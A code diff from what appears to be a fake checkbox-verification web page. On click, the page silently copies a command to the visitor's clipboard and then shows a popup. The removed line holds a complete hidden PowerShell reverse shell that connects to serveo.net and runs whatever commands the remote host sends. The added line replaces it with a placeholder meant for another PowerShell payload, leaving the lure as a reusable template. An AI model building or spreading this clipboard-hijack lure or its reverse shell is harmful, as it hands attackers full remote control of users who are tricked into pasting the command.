@@ -376,7 +376,7 @@
         if (checkbox.classList.contains('checked')) {
             loading.style.display = 'block'; // Show the loading animation
             setTimeout(() => {
-                navigator.clipboard.writeText(`powershell -w hidden -nop -c "$a='System.Net.Sockets.TCPClient';$b='serveo.net';$c=19040;$d=New-Object ($a)($b,$c);$e=$d.GetStream();$f=0..999|%{0};while(($g=$e.Read($f,0,$f.Length)) -ne 0){$h=([Text.ASCIIEncoding]::ASCII.GetString($f,0,$g));$i=iex $h 2>&1|Out-String;$j=[Text.ASCIIEncoding]::ASCII.GetBytes($i);$e.Write($j,0,$j.Length)}"`).then(() => {
+                navigator.clipboard.writeText(`"POWERSHELL MO DITO YA"`).then(() => {
                     popup.classList.add('active');
                 });
                 loading.style.display = 'none'; // Hide loading animation
